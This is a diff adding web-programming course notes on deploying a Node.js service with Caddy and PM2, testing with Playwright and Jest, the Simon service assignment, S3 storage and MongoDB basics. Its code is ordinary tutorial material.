+```
+
+Now Caddy will attempt to proxy the requests, but there is no web service listening on port 5000 and so you will get an error from Caddy if you make a request to tacos.cs260.click.
+
+### Create the web service
+
+Copy the `~/services/startup` directory to a directory that represents the purpose of your service. For example:
+
+```sh
+cp -r ~/services/startup ~/services/tacos
+```
+
+If you list the directory you should see an `index.js` file that is the main JavaScript file for your web service. It has the code to listen on the designated network port and respond to requests. The following is the JavaScript that causes the web service to listen on a port that is provided as an argument to the command line.
+
+```js
+const port = process.argv.length > 2 ? process.argv[2] : 3000;
+app.listen(port, () => {
+  console.log(`Listening on port ${port}`);
+});
+```
+
+There is also a directory named `public` that has static HTML/CSS/JavaScript files that your web service will respond with when requested. The `index.js` file enables this with the following code:
+
+```js
+app.use(express.static('public'));
+```
+
+You can start up the web service, listening on port 5000, using Node as follows.
+
+```sh
+node index.js 5000
+```
+
+You can now access your web service through the browser, or `curl`.
+
+```sh
+curl https://tacos.cs260.click
+```
+
+Caddy will receive the request and map the subdomain name, tacos.cs260.click, to a request for http://localhost:5000. Your web service is listening on port 5000 and so it receives the request and responds.
+
+Stop your web service by pressing CTRL-C in the SSH console that you used to start the service. Now your browser request for your subdomain should return an error again.
+
+### Configure PM2 to host the web service
+
+The problem with running your web service from the console with `node index.js 5000`, is that as soon as you close your SSH session it will terminate all processes you started in that session, including your web service. Instead you need something that is always running in the background to run your web service. This is where daemons come into play. The daemon we use to do this is called PM2.
+
+From your SSH console session run:
+
+```sh
+pm2 ls
+```
+
+This will list the web services that you already have registered with PM2. To run your newly created web service under PM2, make sure you are in your service directory, and run the command similar to the following, with the service name and port substituted to your desired values:
+
+```sh
+cd ~/services/tacos
+pm2 start index.js -n tacos -- 5000
+pm2 save
+```
+
+If you run `pm2 ls` again you should see your web service listed. You can now access your subdomain in the browser and see the proper response. PM2 will keep running your service even after you exit your SSH session.
+
+
+
+# UI testing
+
+<a id="ui-testing"></a>UI Testing:
+[go to top](#top)
+
+[Test driven development](https://www.freecodecamp.org/news/test-driven-development-what-it-is-and-what-it-is-not-41fa6bca02a2/) (TDD) is a proven methodology for accelerating application creation, protecting against regression bugs, and demonstrating correctness. TDD for console based applications and server based code is fairly straight forward. Web application UI code is significantly more complex to test, and using automated tests to drive your UI development is even more difficult.
+
+The problem is that a browser is required to execute UI code. That means you have to actually test the application in the browser. Additionally, every one of the major browsers behaves slightly differently, viewport size makes a big difference, all the code executes asynchronously, network disruptions are common, and then there is the human factor. A human will interact with the browser in very unexpected ways. Clicking where they shouldn't, clicking rapidly, randomly refreshing the browser, flushing cache, not flushing cache, leaving the application up for days on end, switching between tabs, opening the application multiple times, logging in on different tabs, logging out of one tab while still using the application on another tab, or ... on and on. And we haven't even talked about running all the different browsers on all of the possible devices.
+
+Of course the alternative to not test your code doesn't work either. That only means that you have to manually test everything every time you make any change, or you let your users test everything. That is not a good recipe for long term success.
+
+Fortunately this is a problem that many strong players have been working on for decades now, and the solutions, while not perfect, are getting better and better. We will look at two of these solutions. One is for executing automated tests in the browser, and the other is for testing on different browsers and devices.
+
+## Automating the browser - Playwright
+
+📖 **Deeper dive reading**: [Playwright and VS Code](https://playwright.dev/docs/getting-started-VSCode)
+
+No one understands the difficulty of testing applications in a browser better than the companies that build web browsers. They have to test every possible use of HTML, CSS, and JavaScript that a user could think of. There is no way that manual testing is going to work and so early on they started putting hooks into their browsers that allowed them to be driven from automated external processes. [Selenium](https://www.selenium.dev/) was introduced in 2004 as the first popular tool to automate the browser. However, Selenium is generally considered to be flaky and slow. Flakiness means that a test fails in unpredictable, unreproducible ways. When you need thousands of tests to pass before you can deploy a new feature, even a little flakiness becomes a big problem. If those tests take hours to run then you have an even bigger problem.
+
+The market now has lots of alternatives when considering which automated browser framework to use. [State of JS](https://stateofjs.com/) includes statistics on how popular these frameworks are. With frameworks coming and going all of the time, one telling statistic is the frameworks' ability to retain users.
+
+![State of JS testing](javascriptStateOfJsTesting.jpg)
+
+— Retention of browser based testing frameworks (**Source**: _2021.stateofjs.com_)
+
+For the purposes of this instruction, we could pick any of the top contenders. However, we are going to pick a newcomer, [Playwright](https://playwright.dev/). Playwright has some major advantages. It is backed by Microsoft, it integrates really well with VS Code, and it runs as a Node.js process. It is also considered one of the least flaky of the testing frameworks.
+
+As a demonstration of using Playwright, consider the following simplified HTML file containing a button that changes the paragraph text. The button calls a JavaScript function defined in a script element located in the HTML file.
+
+```HTML
+<body>
+  <p id="welcome" data-testid="msg">Hello world</p>
+  <button onclick="changeWelcome()">change welcome</button>
+  <script>
+    function changeWelcome() {
+      const welcomeEl = document.querySelector('#welcome');
+      welcomeEl.textContent = 'I feel welcomed';
+    }
+  </script>
+</body>
+```
+
+First, you need to install Playwright. In your project directory, use NPM to download the Playwright packages, install the browser drivers, configure your project, and create a couple example test files.
+
+```sh
+npm init playwright@latest
+```
+
+Next, you want to install the Playwright extension for VS Code. Go to the extensions tab in VS Code and search for, and install, `Playwright Test for VSCode`.
+
+You can now write your first Playwright test. Take the following and paste it over the `tests/example.spec.js` file that the Playwright install created.
+
+```js
+import { test, expect } from '@playwright/test';
+
+test('testWelcomeButton', async ({ page }) => {
+  // Navigate to the welcome page
+  await page.goto('http://localhost:5500/');
+
+  // Get the target element and make sure it is in the correct starting state
+  const hello = page.getByTestId('msg');
+  await expect(hello).toHaveText('Hello world');
+
+  // Press the button
+  const changeBtn = page.getByRole('button', { name: 'change welcome' });
+  await changeBtn.click();
+
+  // Expect that the change happened correctly
+  await expect(hello).toHaveText('I feel not welcomed');
+});
+```
+
+This test makes sure you can successfully navigate to the desired page, that the page contains the desired elements, that you can press the button and the text changes as expected.
+
+Before you run the test, you actually need your application running for the test to execute against. You can do this by using the VS Code Live Server extension, or if you are testing a Node.js based service then run `npm run start`. You can actually add configuration to your tests so that your application is started when your tests run, but for now, just start up your application before you run the test.
+
+To run the test in VS Code, select the `Test Explorer` tab. You should see your test listed in the explorer. Select the `example.spec.ts` test and press the play button. This will start the test, launch a browser, run the test code to interact with the browser, and display the result. In this case our test fails because it is expecting the resulting text to be `I feel not welcomed` when it actually displays `I feel welcomed`.
+
+The following image should be similar to what you see. You can see the listing of tests on the left and the JavaScript based test in the editor window on the right. When a test fails, the editor window displays a clear description of what went wrong. You can even debug the tests as they execute just like you would any other Node.js based JavaScript execution.
+
+![Playwright](javaScriptPlaywright.png)
+
+You can fix the test by either changing `index.html` or `test/example.spec.js` so that the text matches. Once you have done that you can run the test again and the test explorer should display a green check box.
+
+This is just a simple example of the powerful functionality of Playwright. You are encouraged to explore its functionality and even add some tests to your projects. Once you have gained some competency with Playwright you will find that you can write your code faster and feel more confident when changing things around.
+
+## Testing various devices - BrowserStack
+
+With the ability to run automated UI tests, we now turn our attention to testing on the multitude of various devices. There are several services out there that help with this. One of these is [BrowserStack](https://www.browserstack.com/). BrowserStack lets you pick from a long list of physical devices that you can run interactively, or use when driving automated tests with Selenium. The image below only shows a partial list of iPhone devices. BrowserStack also has devices for Android, Mac, and Windows.
+
+![BrowserStack devices](javaScriptBrowserStackDevices.png)
+
+When you launch a device it connects the browser interface to a physical device hosted in a data center. You can then use the device to reproduce user reported problems, or validate that your implementation works on that specific device. The following image shows the use of BrowserStack to experiment with an iPhone 14 running iOS 16.
+
+![BrowserStack iPhone](javaScriptBrowserStackIPhone.png)
+
+BrowserStack offers free trials if you would like to see how your startup application works on a specific device.
+
+
+
+# Endpoint testing
+
+<a id="endpoint-testing"></a>Endpoint Testing:
+[go to top](#top)
+
+Using test driven development (TDD) for testing service endpoints is a common industry practice. Testing services is usually easier than writing UI tests because it does not require a browser. However, it does still take effort to learn how to write tests that are effective and efficient. Making this a standard part of your development process will give you a significant advantage as you progress in your professional career.
+
+As demonstrated by the following [State of JS](https://2021.stateofjs.com/en-US/libraries/testing/) survey, there are lots of good testing packages that work well with Express driven services. We are going to look at the current champion [Jest](https://jestjs.io/).
+
+![State of JS Testing](webServicesStateOfJsEndpointTesting.jpg)
+
+To get started with Jest we need a simple web service. In a console window, create a test directory, install Express, and open up VS Code.
+
+```sh
+mkdir testJest
+cd testJest
+npm init -y
+npm install express
+code .
+```
+
+Now create a file named `server.js` and use Express to create an application with two endpoints: one to get a store (getStore), and another to update a store.
+
+**server.js**
+
+```js
+const express = require('express');
+const app = express();
+
+app.use(express.json());
+
+// Endpoints
+app.get('/store/:storeName', (req, res) => {
+  res.send({ name: req.params.storeName });
+});
+
+app.put('/store/:storeName', (req, res) => {
+  req.body.updated = true;
+  res.send(req.body);
+});
+
+module.exports = app;
+```
+
+In order to allow Jest to start up the HTTP server when running tests, we initialize the application a little bit differently than we have in the past. Normally, we would have just started listening on the Express `app` object after we defined our endpoints. Instead we export the Express `app` object from our `server.js` file and then import the app object in the `index.js` file that is used to run our service.
+
+**index.js**
+
+```js
+const app = require('./server');
+
+const port = 8080;
+app.listen(port, function () {
+  console.log(`Listening on port ${port}`);
+});
+```
+
+Breaking apart the definition of the service from the starting of the service allows us to start the service both when we run normally and also when using our testing framework.
+
+![Jest endpoint requests](endpointTestingJest.jpg)
+
+You can test that the service is working properly by running the service in the VS Code debugger and pressing F5 while viewing the `index.js` file. Then open a browser and navigate to `http://localhost:8080/store/provo`. Stop the debugging session once you have demonstrated that the service is working correctly.
+
+To launch the service using Jest we create another file that has a suffix of `.test.js`. Any file with that suffix is considered a testing file and will automatically be discovered by Jest and examined for tests to run.
+
+## A simple test
+
+Before we write tests for our endpoints we will write a simple test that demonstrates how Jest works. A test is created by calling the Jest `test` function. Note that you don't need to include a `require` statement to import Jest functions into your code. Jest will automatically import itself when it discovers a test file.
+
+Let's make our first test by creating a file named `store.test.js` and pasting in the following code.
+
+**store.test.js**
+
+```js
+test('that equal values are equal', () => {
+  expect(false).toBe(true);
+});
+```
+
+The `test` function takes a description as the first parameter. The description is meant to be human readable. In this case it reads: "test that equal values are equal". The second parameter is the function to call. Our function just calls the Jest `expect` function and chains it to the `toBe` function. You can read this as "expect false to be true", which of course is not true, but we want to see our test fail the first time we run it. We will fix this later so that we can show what happens when a test succeeds.
+
+In order to run the test we need to install the Jest package using NPM. From the console install the package. The `-D` parameter tells NPM to install Jest as a development package. That keeps it from being included when we do production release builds.
+
+```sh
+npm install jest -D
+```
+
+Now, replace the `scripts` section of the `package.json` file with a new command that will run our tests with Jest.
+
+```json
+"scripts": {
+  "test": "jest"
+},
+```
+
+With that in place we can run the `test` command and our test will execute. Notice that Jest shows exactly where the test failed and what expected values were not received.
+
+```sh
+➜ npm run test
+
+ FAIL  ./store.test.js
+  ✕ that unequal values are not equal (1 ms)
+
+  ● that unequal values are not equal
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: true
+    Received: false
+
+      3 |
+      4 | test('that unequal values are not equal', () => {
+    > 5 |   expect(false).toBe(true);
+        |                 ^
+      6 | });
+      7 |
+      8 | // describe('endpoints', () => {
+
+      at Object.toBe (store.test.js:5:17)
+
+Tests:       1 failed, 1 total
+```
+
+We can then fix our test by rewriting it so that the expected value matches the provided value.
+
+**store.test.js**
+
+```js
+test('that equal values are equal', () => {
+  expect(true).toBe(true);
+});
+```
+
+This time when we run the test it passes.
+
+```sh
+➜  npm run test
+
+ PASS  ./store.test.js
+  ✓ that equal values are equal (1 ms)
+
+Tests:       1 passed, 1 total
+```
+
+Note that this example didn't actually test any of our code, but it does demonstrate how easy it is to write tests. A real test function would call code in your program. Let's do this by actually making calls to our endpoints.
+
+## Testing endpoints
+
+To test our endpoints we need another package so that we can make HTTP requests without having to actually send them over the network. This is done with the NPM package called `supertest`. Go ahead and install this now.
+
+```sh
+npm install supertest -D
+```
+
+We can then alter `store.test.js` to import our Express service and also the `request` function from `supertest` that we will use to make HTTP requests.
+
+To make an HTTP request you pass the Express `app` to the `supertest` `request` function and then chain on the HTTP verb function that you want to call, along with the endpoint path. You can then chain on as many `expect` functions as you would like. In the following example we will expect an HTTP status code of 200 (OK), and that the body of the response contains the object that we expect the endpoint to return.
+
+If something goes wrong, the `end` function will contain an error and we pass the error along to the `done` function. Otherwise we just call `done` without the error.
+
+**store.test.js**
+
+```js
+const request = require('supertest');
+const app = require('./server');
+
+test('getStore returns the desired store', (done) => {
+  request(app)
+    .get('/store/provo')
+    .expect(200)
+    .expect({ name: 'provo' })
+    .end((err) => (err ? done(err) : done()));
+});
+```
+
+When we run this test we see that it passes without error.
+
+```sh
+➜  npm run test
+
+ PASS  ./store.test.js
+  ✓ getStore returns the desired store (16 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.237 s, estimated 1 s
+```
+
+You can change the test to expect a status code of 500 (Server Error) if you want to see the test fail. You can also change the endpoint code to return a 201 status code (Created) and also see the test fail.
+
+Now we can add a test for the updateStore endpoint. To do this we can copy the getStore endpoint, change the description, change the HTTP function verb to `put`, and send the body of the `put` request using the chained `send` function.
+
+```js
+const request = require('supertest');
+const app = require('./server');
+
+test('updateStore saves the correct values', (done) => {
+  request(app)
+    .put('/store/provo')
+    .send({ items: ['fish', 'milk'] })
+    .expect(200)
+    .expect({ items: ['fish', 'milk'], updated: true })
+    .end((err) => (err ? done(err) : done()));
+});
+
+test('getStore returns the desired store', (done) => {
+  request(app)
+    .get('/store/provo')
+    .expect(200)
+    .expect({ name: 'provo' })
+    .end((err) => (err ? done(err) : done()));
+});
+```
+
+The great thing about test driven development (TDD) is that you can actually write your tests first and then write your code based upon the design represented by the tests. When your tests pass you know your code is complete. Additionally, when you make later modifications to your code you can simply run your tests again. If they pass then you can be confident that your code is still working without having to manually test everything yourself. With systems that have hundreds of endpoints and hundreds of thousands of lines of code, TDD becomes an indispensable part of the development process.
+
+
+
+# Simon Service
+
+<a id="simon-service"></a>Simon Service:
+[go to top](#top)
+
+![Simon](../simon.png)
+
+This deliverable demonstrates converting the JavaScript application into a web application by implementing a web service that listens on a network port for HTTP requests. The web service provides endpoints for getting and updating the scores. The application also uses a couple third party endpoints to display inspirational quotes on the about page and show a random header image.
+
+We will use Node.js and Express to create our HTTP service.
+
+You can view this application running here: [Example Simon Service](https://simon-service.cs260.click)
+
+![Simon Service](simonService.jpg)
+
+## Service endpoint definitions
+
+Here is our design, documented using `curl` commands, for the two endpoints that the Simon web service provides.
+
+**GetScores** - Get the latest high scores.
+
+```sh
+curl -X GET /api/scores
+
+#Response
+{ "scores":[
+  {"name":"Harvey", "score":"337", "date":"2022/11/20"},
+  {"name":"도윤 이", "score":"95", "date":"2019/05/20"}
+]}
+```
+
+**SubmitScore** - Submit a score for consideration in the list of high scores.
+
+```sh
+curl -X POST /api/score -d '{"name":"Harvey", "score":"337", "date":"2022/11/20"}'
+
+#Response
+{ "scores":[
+  {"name":"Harvey", "score":"337", "date":"2022/11/20"},
+  {"name":"도윤 이", "score":"95", "date":"2019/05/20"}
+]}
+```
+
+## Third party endpoints
+
+The `about.js` file contains code for making calls to third party endpoints using `fetch`. We make one call to `picsum.photos` to get a random picture and another to `quotable.io` to get a random quote. Once the endpoint asynchronously returns, the DOM is updated with the requested data. Here is an example of the quote endpoint call.
+
+```js
+function displayQuote(data) {
+  fetch('https://api.quotable.io/random')
+    .then((response) => response.json())
+    .then((data) => {
+      const containerEl = document.querySelector('#quote');
+
+      const quoteEl = document.createElement('p');
+      quoteEl.classList.add('quote');
+      const authorEl = document.createElement('p');
+      authorEl.classList.add('author');
+
+      quoteEl.textContent = data.content;
+      authorEl.textContent = data.author;
+
+      containerEl.appendChild(quoteEl);
+      containerEl.appendChild(authorEl);
+    });
+}
+```
+
+## Steps to convert Simon to a service
+
+Converting Simon to a service involved the following steps.
+
+1. Move all the previous deliverable code files (_.html, _.js, \*.css, favicon.ico, and assets) into a sub-directory named `public`. We will use the HTTP Node.js based service to host the frontend application files. This is done with the static file middleware that we will add our service `index.js`.
+
+   ```js
+   app.use(express.static('public'));
+   ```
+
+   When running our service the static file middleware takes care of reading the frontend code from the `public` directory and returning it to the browser. The service only directly handles the endpoint requests.
+
+   ![Simon service](../simonReact/simonProduction.jpg)
+
+1. Within the project directory run `npm init -y`. This configures the directory to work with **node.js**.
+1. Modify or create `.gitignore` to ignore `node_modules`.
+1. Install the Express package by running `npm install express`. This will write the Express package dependency in the `package.json` file and install all the Express code to the `node_modules` directory.
+1. Create a file named `index.js` in the root of the project. This is the entry point that **node.js** will call when you run your web service.
+1. Add the basic Express JavaScript code needed to host the application static content and the desired endpoints.
+
+   ```js
+   const express = require('express');
+   const app = express();
+
+   // The service port. In production the frontend code is statically hosted by the service on the same port.
+   const port = process.argv.length > 2 ? process.argv[2] : 3000;
+
+   // JSON body parsing using built-in middleware
+   app.use(express.json());
+
+   // Serve up the frontend static content hosting
+   app.use(express.static('public'));
+
+   // Router for service endpoints
+   const apiRouter = express.Router();
+   app.use(`/api`, apiRouter);
+
+   // GetScores
+   apiRouter.get('/scores', (_req, res) => {
+     res.send(scores);
+   });
+
+   // SubmitScore
+   apiRouter.post('/score', (req, res) => {
+     scores = updateScores(req.body, scores);
+     res.send(scores);
+   });
+
+   // Return the application's default page if the path is unknown
+   app.use((_req, res) => {
+     res.sendFile('index.html', { root: 'public' });
+   });
+
+   app.listen(port, () => {
+     console.log(`Listening on port ${port}`);
+   });
+   ```
+
+1. Modify the Simon application code to make service endpoint requests to our newly created HTTP service code.
+
+   ```js
+   async function loadScores() {
+     const response = await fetch("/api/scores")
+     const scores = await response.json()
+
+     // Modify the DOM to display the scores
+   ```
+
+## Study this code
+
+Get familiar with what the example code teaches.
+
+- Clone the repository to your development environment.
+
+  ```sh
+  git clone https://github.com/webprogramming260/simon-service.git
+  ```
+
+- Review the code and get comfortable with everything it represents.
+- Debug the code in your browser by hosting it from a VS Code debug session. This [video on debugging a node.js based service](https://youtu.be/B0le_Z_2TQY) will step you through the process.
+
+  ⚠ You will no longer use the `live server` extension to launch your frontend code in the browser since your frontend code will now be served up by the Node.js server you created in `index.js`. Set breakpoints in your backend code inside of VS Code.
+
+- Use the browser's dev tools to set breakpoints in the frontend code and step through it each line.
+- Make modifications to the code as desired. Experiment and see what happens.
+
+## Deploy to production
+
+- Deploy to your production environment using a copy of the `deployService.sh` script found in the [example class application](https://github.com/webprogramming260/simon-service/blob/main/deployService.sh). Take some time to understand how it works.
+
+  ```sh
+  ./deployService.sh -k <yourpemkey> -h <yourdomain> -s simon
+  ```
+
+  For example,
+
+  ```sh
+  ./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s simon
+  ```
+
+  ⚠ **NOTE** - The deployment script for this project is different from previous deployment scripts, since it needs to set up the Node.js service for your backend code, and copy your frontend code to the `public` directory. You also want to make sure that your Node.js HTTP service code for Simon is configured to listen on port 3000. When you deploy your Startup you want to make sure that code is configured to listen on port 4000.
+
+- Update your `startup` repository `notes.md` with what you learned.
+- Make sure your project is visible from your production environment (e.g. https://simon.yourdomain.click).
+
+
+
+# Startup Service
+
+<a id="startup-service"></a>Startup Service:
+[go to top](#top)
+
+Now that you have learned how to use and create services, it is time to add backend support to your startup application. The main things you should focus on in this deliverable include serving up your frontend code through Node.js, calling third party services, and providing your own service endpoints.
+
+You must use the same startup GitHub repository that you created in the earlier instruction. Update the `notes.md` file with things that you learn as you work on your startup. As you make changes to your HTML, CSS, and JavaScript, commit those changes and push them to GitHub. You will need at least four commits to get full credit, but in reality you should have many more than that.
+
+Remember to use the browser's debugger window to debug your frontend HTML, CSS and JavaScript. You can also debug your backend service JavaScript running on Node.js using the built in VS Code Node.js debugger. You should no longer be using the VS Code Live Server extension to serve up your frontend code to the browser since your Node.js server code should now do that.
+
+Once you have developed your application to where you want it, you need to release it to your production environment. **Replace** your previous startup deployment script with a copy of the `deployService.sh` script from the [Simon Service repository](https://github.com/webprogramming260/simon-service/blob/main/deployService.sh) and use `startup` for the service parameter (`-s`).
+
+```sh
+./deployService.sh -k <yourpemkey> -h <yourdomain> -s startup
+```
+
+For example,
+
+```sh
+./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s startup
+```
+
+Doing this will make this deliverable of your startup available from `https://startup.yourdomainname`.
+
+## ☑ Assignment
+
+1. Review and deploy Simon Service
+   1. Clone the Simon Service repository to your development environment.
+   1. Run `npm install` in the root of the project.
+   1. Open the project in VS Code and examine the application's use of Node.js, Express, and JavaScript to create service endpoints.
+   1. Execute in your development environment by debugging the application using VS Code's Node.js debugger (press F5 while viewing `index.js`). Set breakpoints in VS Code and step through the backend JavaScript.
+   1. Open your browser to https://localhost:3000 and use the browser's dev tools to step through the frontend JavaScript using the Source tab.
+   1. Deploy to your production environment using the deployment script so that it is available with your domain's `simon` subdomain.
+1. Convert your startup application into a web service using Node.js and Express.
+1. Serve up your frontend code using the Express static middleware.
+1. Provide endpoints for your service.
+1. Call your endpoints from your frontend code.
+1. Call third party endpoints from your frontend code. This can be as simple as displaying a quote like Simon does.
+1. Debug your application using VS Code's Node debugger and the browser's dev tools, in your development environment, to verify it is working correctly.
+1. Periodically commit and push your code to GitHub.
+1. Periodically update your startup repository's notes.md file to reflect what you have learned and want to remember.
+1. Push your final version of your project to GitHub.
+1. Deploy your startup application to your production environment (your server).
+1. Make sure your application is available from your production environment.
+1. Upload the URL to your startup application to the Canvas assignment.
+
+## Grading Rubric
+
+- (Required) Simon Service deployed to your production environment
+- (Required) A link to your GitHub startup repository prominently displayed on your application's home page
+- (Required) Notes in your startup Git repository README.md file documenting what you modified and added with this deliverable. The TAs will only grade things that have been clearly described as being completed. Review the [voter app](https://github.com/webprogramming260/startup-example) as an example.
+- Backend web service support and interaction
+  - 30% - Create an HTTP service using Node.js and Express
+  - 10% - Frontend served up using Express static middleware
+  - 10% - Your frontend calls third party service endpoints
+  - 20% - Your backend provides service endpoints
+  - 20% - Your frontend calls your service endpoints
+- 10% - Multiple Git commits with meaningful comments.
+
+## Go celebrate
+
+You did it! This is a significant milestone. Time to grab some friends, show them what you did, and celebrate by watching a movie with popcorn 🍿.
+
+
+
+
+
+# Storage services
+
+<a id="storage-service"></a>Storage Services:
+[go to top](#top)
+
+Web applications commonly need to store files associated with the application or the users of the application. This includes files such as images, user uploads, documents, and movies. Files usually have an ID, some metadata, and the bytes representing the file itself. These can be stored using a database service, but usually that is overkill and a simpler solution will be cheaper.
+
+It might be tempting to store files directly on your server. This is usually a bad idea for several reasons.
+
+1. Your server has limited drive space. If you server runs out of drive space your entire application will fail.
+1. You should consider your server as being ephemeral, or temporary. It can be thrown away and replaced by a copy at any time. If you start storing files on the server, then your server has state that cannot be easily replaced.
+1. You need backup copies of your application and user files. If you only have one copy of your files on your server, then they will disappear when your server disappears, and you must always assume that your server will disappear.
+
+Instead you want to use a storage service that is specifically designed to support production storage and delivery of files.
+
+## AWS S3
+
+There are many such solutions out there, but one of the most popular ones is [AWS S3](https://aws.amazon.com/s3/). S3 provides the following advantages:
+
+1. It has unlimited capacity
+1. You only pay for the storage that you use
+1. It is optimized for global access
+1. It keeps multiple redundant copies of every file
+1. You can version the files
+1. It is performant
+1. It supports metadata tags
+1. You can make your files publicly available directly from S3
+1. You can keep your files private and only accessible to your application
+
+In this course we will not be using any storage services for the Simon project. If, however, you want to use S3 as the storage service for your Startup application, then you need to learn how to use the AWS SDK. You can find detailed information about using AWS S3 with Node.js on the [AWS website](https://docs.aws.amazon.com/sdk-for-javascript/v2/developer-guide/getting-started-nodejs.html). Generally, the steps you need to take include:
+
+1. Creating a S3 bucket to store your data in.
+1. Getting credentials so that your application can access the bucket.
+1. [Using](https://docs.aws.amazon.com/sdk-for-javascript/v2/developer-guide/setting-credentials-node.html) the credentials in your application.
+1. Using the [SDK](https://docs.aws.amazon.com/sdk-for-javascript/v2/developer-guide/s3-example-creating-buckets.html) to write, list, read, and delete files from the bucket.
+
+⚠ Make sure that you do not include your credentials in your code. If you check your credentials into your GitHub repository they will immediately be stolen and used by hackers to take over your AWS account. This may result in significant monetary damage to you.
+
+
+
+
+# Data services
+
+<a id="data-service"></a>Data Services:
+[go to top](#top)
+
+Web applications commonly need to store application and user data persistently. The data can be many things, but it is usually a representation of complex interrelated objects. This includes things like a user profile, organizational structure, game play information, usage history, billing information, peer relationship, library catalog, and so forth.
+
+![Data service](dataService.jpg)
+
+Historically, SQL databases have served as the general purpose data service solution, but starting around 2010, specialty data services that better support document, graph, JSON, time, sequence, and key-value pair data began to take significant roles in applications from major companies. These data services are often called NoSQL solutions because they do not use the general purpose relational database paradigms popularized by SQL databases. However, they all have very different underlying data structures, strengths, and weaknesses. That means that you should not simply split all of the possible data services into two narrowly defined boxes, SQL and NoSQL, when you are considering the right data service for your application.
+
+Here is a list of some of the popular data services that are available.
+
+| Service       | Specialty             |
+| ------------- | --------------------- |
+| MySQL         | Relational queries    |
+| Redis         | Memory cached objects |
+| ElasticSearch | Ranked free text      |
+| MongoDB       | JSON objects          |
+| DynamoDB      | Key value pairs       |
+| Neo4J         | Graph based data      |
+| InfluxDB      | Time series data      |
+
+## MongoDB
+
+![MongoDB logo](webServicesMongoLogo.png)
+
+For the projects in this course that require data services, we will use `MongoDB`. Mongo increases developer productivity by using JSON objects as its core data model. This makes it easy to have an application that uses JSON from the top to the bottom of the technology stack. A mongo database is made up of one or more collections that each contain JSON documents. You can think of a collection as a large array of JavaScript objects, each with a unique ID. The following is a sample of a collection of houses that are for rent.
+
+```js
+[
+  {
+    _id: '62300f5316f7f58839c811de',
+    name: 'Lovely Loft',
+    summary: 'A charming loft in Paris',
+    beds: 1,
+    last_review: {
+      $date: '2022-03-15T04:06:17.766Z',
+    },
+    price: 3000,
+  },
+  {
+    _id: '623010b97f1fed0a2df311f8',
+    name: 'Infinite Views',
+    summary: 'Modern home with infinite views from the infinity pool',
+    property_type: 'House',
+    beds: 5,
+    price: 250,
+  },
+];
+```
+
+Unlike relational databases that require a rigid table definition where each column must be strictly typed and defined beforehand, Mongo has no strict schema requirements. Each document in the collection usually follows a similar schema, but each document may have specialized fields that are present, and common fields that are missing. This allows the schema of a collection to morph organically as the data model of the application evolves. To add a new field to a Mongo collection you just insert the field into the documents as desired. If the field is not present, or has a different type in some documents, then the document simply doesn't match the query criteria when the field is referenced.
+
+The query syntax for Mongo also follow a JavaScript-inspired flavor. Consider the following queries on the houses for rent collection that was shown above.
+
+```js
+// find all houses
+db.house.find();
+
+// find houses with two or more bedrooms
+db.house.find({ beds: { $gte: 2 } });
+
+// find houses that are available with less than three beds
+db.house.find({ status: 'available', beds: { $lt: 3 } });
+
+// find houses with either less than three beds or less than $1000 a night
+db.house.find({ $or: [(beds: { $lt: 3 }), (price: { $lt: 1000 })] });
+
+// find houses with the text 'modern' or 'beach' in the summary
+db.house.find({ summary: /(modern|beach)/i });
+```
+
+### Using MongoDB in your application
+
+📖 **Deeper dive reading**: [MongoDB tutorial](https://www.mongodb.com/developer/languages/javascript/node-crud-tutorial/)
+
+The first step to using Mongo in your application is to install the `mongodb` package using NPM.
+
+```sh
+➜ npm install mongodb
+```
+
+With that done, you then use the `MongoClient` object to make a client connection to the database server. This requires a username, password, and the hostname of the database server.
+
+```js
+const { MongoClient } = require('mongodb');
+
+const userName = 'holowaychuk';
+const password = 'express';
+const hostname = 'mongodb.com';
+
+const url = `mongodb+srv://${userName}:${password}@${hostname}`;
+
+const client = new MongoClient(url);
+```
+
+With the client connection you can then get a database object and from that a collection object. The collection object allows you to insert, and query for, documents. You do not have to do anything special to insert a JavaScript object as a Mongo document. You just call the `insertOne` function on the collection object and pass it the JavaScript object. When you insert a document, if the database or collection does not exist, Mongo will automatically create them for you. When the document is inserted into the collection it will automatically be assigned a unique ID.
+
+```js
+const collection = client.db('rental').collection('house');
+
+const house = {
+  name: 'Beachfront views',
+  summary: 'From your bedroom to the beach, no shoes required',
+  property_type: 'Condo',
+  beds: 1,
+};
+await collection.insertOne(house);
+```
+
+To query for documents you use the `find` function on the collection object. Note that the find function is asynchronous and so we use the `await` keyword to wait for the promise to resolve before we write them out to the console.
+
+```js
+const cursor = collection.find();
+const rentals = await cursor.toArray();
+rentals.forEach((i) => console.log(i));
+```
+
+If you do not supply any parameters to the `find` function then it will return all documents in the collection. In this case we only get back the single document that we previously inserted. Notice that the automatically generated ID is returned with the document.
+
+**Output**
+
+```js
+[
+  {
+    _id: new ObjectId('639a96398f8de594e198fc13'),
+    name: 'Beachfront views',
+    summary: 'From your bedroom to the beach, no shoes required',
+    property_type: 'Condo',
+    beds: 1,
+  },
+];
+```
+
+You can provide a query and options to the `find` function. In the example below we query for a `property_type` of Condo that has less than two bedrooms. We also specify the options to sort by descending price, and limit our results to the first 10 documents.
+
+```js
+const query = { property_type: 'Condo', beds: { $lt: 2 } };
+
+const options = {
+  sort: { price: -1 },
+  limit: 10,
+};
+
+const cursor = collection.find(query, options);
+const rentals = await cursor.toArray();
+rentals.forEach((i) => console.log(i));
+```
+
+The query matches the document that we previously inserted and so we get the same result as before.
+
+There is a lot more functionality that MongoDB provides, but this is enough to get you started. If you are interested you can explore the tutorials on their [website](https://www.mongodb.com/docs/).
+
+## Managed services
+
+Historically each application development team would have developers that managed the data service. Those developers would acquire hardware, install the database software, monitor the memory, cpu, and disk space, control the data schema, and handle migrations and upgrades. Much of this work has now moved to services that are hosted and managed by a 3rd party. This relieves the development team from much of the day-to-day maintenance. The team can instead focus more on the application and less on the infrastructure. With a managed data service you simply supply the data and the service grows, or shrinks, to support the desired capacity and performance criteria.
+
+### MongoDB Atlas
+
+All of the major cloud providers offer multiple data services. For this class we will use the data service provided by MongoDB called [Atlas](https://www.mongodb.com/atlas/database). No credit card or payment is required to set up and use Atlas, as long as you stick to the shared cluster environment.
+
+[![Mongo sign up](webServicesMongoSignUp.jpg)](https://www.mongodb.com/atlas/database)
+
